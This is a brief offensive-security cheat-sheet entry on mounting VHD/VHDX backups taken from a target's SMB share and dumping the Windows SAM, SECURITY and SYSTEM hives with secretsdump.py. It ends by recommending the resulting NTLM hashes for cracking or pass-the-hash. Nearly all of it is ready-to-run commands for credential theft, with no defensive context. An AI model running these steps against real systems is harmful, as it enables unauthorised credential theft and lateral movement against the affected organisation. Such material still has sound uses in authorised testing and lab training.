# VHD Image Mount + Registry Hive Dump

VHD/VHDX backup files found on SMB shares can be mounted on Linux and their SAM/SYSTEM hives dumped offline.

**Mount the VHD:**
```bash
apt install libguestfs-tools
# mount the share first
mount -t cifs //<TARGET>/Backups /mnt -o user=,password=

# try each VHD — only one will be the system drive
guestmount --add /mnt/path/to/image.vhd --inspector --ro /mnt2/
```

**Dump credentials from the SAM hive:**
```bash
secretsdump.py -sam /mnt2/Windows/System32/config/SAM \
               -security /mnt2/Windows/System32/config/SECURITY \
               -system /mnt2/Windows/System32/config/SYSTEM LOCAL
```

NTLM hashes from the dump can be cracked or used directly for pass-the-hash.
